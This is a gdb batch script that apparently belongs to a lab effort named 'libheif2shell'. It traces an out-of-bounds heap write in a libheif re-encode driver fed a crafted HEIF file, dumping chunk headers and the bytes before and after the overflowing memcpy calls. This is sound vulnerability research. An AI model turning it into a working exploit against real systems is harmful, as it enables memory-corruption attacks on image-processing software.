# gdb batch probe: heap bytes past the reallocated plane on the real file path.
# Usage: gdb -q -batch -x gdb_neighbour.cmd <plain-reencode-driver>
# Run from the repository root; INPUT is the crafted patterned HEIF below.
set pagination off
set confirm off
set print pretty off
break calloc if $rsi == 32783
run lab/frontier/libheif2shell/real/neighbour/pattern-mixed.heif /tmp/libheif-neighbour-out.heif
# The 32783-byte calloc fires three times: read/setup, frame 0 plane, frame 1 new plane.
finish
continue
finish
continue
finish
set $p = $rax
printf "PLANE=%p calloc(1,32783)\n", $p
printf "--- chunk header at plane-16 (size should be 0x8021) ---\n"
x/2gx $p-16
break __memcpy_avx_unaligned_erms if $rdx == 64 && $rdi >= $p + 32768
continue
printf "OOB_ROW_A dest_off=%ld src=%p\n", $rdi-$p, $rsi
printf "A source 64 bytes (decoded frame-1 row):\n"
x/64bx $rsi
printf "A destination 64 bytes BEFORE the store (offset 32768):\n"
x/64bx $rdi
continue
printf "OOB_ROW_B dest_off=%ld src=%p\n", $rdi-$p, $rsi
printf "B source 64 bytes:\n"
x/64bx $rsi
continue
printf "STOP rip=%p fault_dest=%p fault_dest_off=%ld\n", $rip, $rdi, $rdi-$p
printf "--- destination plane+32768 AFTER stores ---\n"
x/64bx $p+32768
printf "--- destination plane+33280 AFTER stores ---\n"
x/64bx $p+33280
bt 4
quit
